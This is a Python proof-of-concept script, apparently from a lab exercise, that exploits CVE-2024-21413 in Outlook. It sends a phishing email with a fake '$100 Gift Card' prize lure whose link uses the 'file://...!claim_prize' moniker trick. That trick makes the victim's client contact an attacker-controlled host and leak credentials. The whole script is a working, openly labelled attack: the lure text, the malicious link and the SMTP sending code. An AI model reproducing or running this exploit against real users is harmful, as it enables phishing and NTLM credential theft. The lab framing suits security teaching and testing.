'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'sender@kali.local' # Replace with your sender email address
receiver_email = 'testuser@kali.local' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
  <body style="font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
    <div style="background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); max-width: 600px; margin: auto;">
      <h2 style="color: #4CAF50;">Congratulations!</h2>
      <p>Dear Valued User,</p>
      <p>We are excited to inform you that you have been selected as the lucky winner of our <strong>Monthly Rewards Program</strong>!</p>
      <p>You have won a <strong>$100 Gift Card</strong>! üéÅ</p>
      <p>To claim your prize, simply click the button below:</p>
      <p style="text-align: center; margin: 30px 0;">
        <a href="file://kali.local/share!claim_prize" style="background-color: #4CAF50; color: white; padding: 12px 20px; text-decoration: none; border-radius: 5px; font-size: 16px;">
          Claim Your Gift
        </a>
      </p>
      <p style="font-size: 12px; color: #888;">Please claim your prize within 24 hours to avoid forfeiture.</p>
      <p>Thank you for being a valued user!</p>
      <p>The Rewards Team</p>
    </div>
  </body>
</html>
"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('Attacker', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('192.168.x.x', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()